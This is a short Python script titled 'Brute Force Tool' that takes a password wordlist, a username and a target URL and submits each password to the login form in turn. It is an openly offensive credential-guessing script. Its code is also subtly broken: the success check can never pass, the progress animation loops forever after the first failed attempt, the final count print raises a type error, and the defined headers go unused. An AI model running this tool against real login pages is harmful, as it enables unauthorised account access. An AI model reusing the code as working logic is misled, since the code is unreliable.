'''
..............................
. @Name:    Brute Force Tool .
. @Author:  f1nl0wt3ch       .
. @Date:    28.12.2020       .
..............................

'''

import requests
import argparse
import itertools
import threading
import time
import sys

def _three_dots_animate(done):
    for c in itertools.cycle(['.', '.', '.', '\\']):
        if done:
            break
        sys.stdout.write('\rBrute forcing ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

def _animate(done):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rBrute forcing ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

def _scan_password_using_curl_form(pathFile, user, targetUrl):
    done = False
    line_count = 0
    headers = {
            "Content-Type": "application/json;charset=utf-8",
            "Accept": "application/json"
            }
    with open(pathFile) as f:
        for password in f:
            r=requests.post(targetUrl, data={"username":user, "password":password, "submit":"submit"})
            if hasattr(r,'success') and r.success:
                done = True
                print("Password found: "+password)
                break
            else:
                line_count += 1
                _three_dots_animate(done)
                continue
        print(line_count+" passwords are scanned!")        

def _initialize_args():
    parser = argparse.ArgumentParser('L0wT3ch Bruteforce Tool')
    parser.add_argument("-P","--path",type=str,help="Path Of Password Dictionary")
    parser.add_argument("-U", "--username",type=str,help="Target Username")
    parser.add_argument("-H","--host",type=str,help="Target Host")

    args = parser.parse_args()
    return args

def start():
    try:
        # Initialize arguments
        args = _initialize_args()
        pathFile = args.path
        user = args.username
        targetUrl = args.host
        # Start scanning
        _scan_password_using_curl_form(pathFile, user, targetUrl)
    except Exception as e:
        print("Something error!"+str(e))
        exit(0)
if __name__ == '__main__':
    start()
    print("Finished")